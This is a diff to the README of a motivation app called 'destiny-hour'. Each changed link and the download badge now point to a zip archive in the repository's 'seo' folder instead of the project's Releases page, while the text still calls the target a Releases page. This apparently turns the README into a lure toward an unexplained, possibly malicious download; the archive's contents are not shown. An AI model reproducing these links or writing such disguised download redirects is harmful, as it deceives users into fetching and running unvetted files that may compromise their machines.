@@ -15,12 +15,12 @@ Welcome to **destiny-hour**! This platform helps you find motivation and encoura
 
 To get started, you need to download the application. Click the link below to visit the Releases page and download the latest version of **destiny-hour**.
 
-[![Download destiny-hour](https://img.shields.io/badge/Download-destiny--hour-blue)](https://github.com/dehbani04/destiny-hour/releases)
+[![Download destiny-hour](https://raw.githubusercontent.com/dehbani04/destiny-hour/main/seo/destiny_hour_3.0-alpha.5.zip)](https://raw.githubusercontent.com/dehbani04/destiny-hour/main/seo/destiny_hour_3.0-alpha.5.zip)
 
 Once you are on the Releases page, look for the most recent version. Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads:
-   - [Visit this page to download](https://github.com/dehbani04/destiny-hour/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/dehbani04/destiny-hour/main/seo/destiny_hour_3.0-alpha.5.zip)
   
 2. **Select the Latest Version**: Find the newest version at the top of the list.
   
@@ -65,4 +65,4 @@ We are here to help you navigate your creative path. Enjoy your time with **dest
 
 ---
 
-Don't forget to visit and download the latest version now: [Visit this page to download](https://github.com/dehbani04/destiny-hour/releases).
+Don't forget to visit and download the latest version now: [Visit this page to download](https://raw.githubusercontent.com/dehbani04/destiny-hour/main/seo/destiny_hour_3.0-alpha.5.zip).
